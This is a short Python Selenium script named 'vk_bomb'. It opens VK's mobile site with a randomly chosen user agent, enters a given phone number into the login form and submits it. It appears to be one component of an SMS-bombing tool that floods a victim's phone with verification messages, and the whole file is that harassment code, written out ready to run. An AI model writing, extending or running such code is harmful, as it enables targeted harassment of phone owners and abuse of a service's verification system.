import time
import random
from selenium import webdriver
from selenium.webdriver.common.by import By

def vk_bomb(nomer=None):
    with open("User_agent/SeoLik_Список_mobile_user_agent.txt", "r") as user_agent_file:
        user_agents_list = list(user_agent_file)


    #options
    options = webdriver.ChromeOptions()
    options.add_argument(f"user-agent={random.choice(user_agents_list)}")
    #options.add_argument("--headless")

    url = "https://m.vk.com/"
    driver = webdriver.Chrome(options=options)
    driver.get(url)

    try:
        driver.implicitly_wait(10)
        vvesti = driver.find_element(By.XPATH, "/html/body/div[3]/div[2]/div[2]/div/div[3]/div[1]/div[2]/div[2]/div/div[6]/a").click()
    except Exception as vvesti_VK:
        print("vvesti_VK")
    try:
        driver.implicitly_wait(10)
        nomer = driver.find_element(By.XPATH, "/html/body/div[1]/div/div/div/div/div[1]/div[2]/div/div/div/form/div[1]/section/div[1]/div/div/input").send_keys(nomer)
    except Exception as nomer_VK:
        print("nomer_VK")
    try:
        driver.implicitly_wait(10)
        knopka_VK = driver.find_element(By.XPATH, "/html/body/div[1]/div/div/div/div/div[1]/div[2]/div/div/div/form/div[2]/div[1]/button/span[1]/span").click()
    except Exception as knopka_VK:
        print("knopka_VK")

    time.sleep(1)
    driver.quit()

def main():
    vk_bomb()

if __name__ == "__main__":
    main()


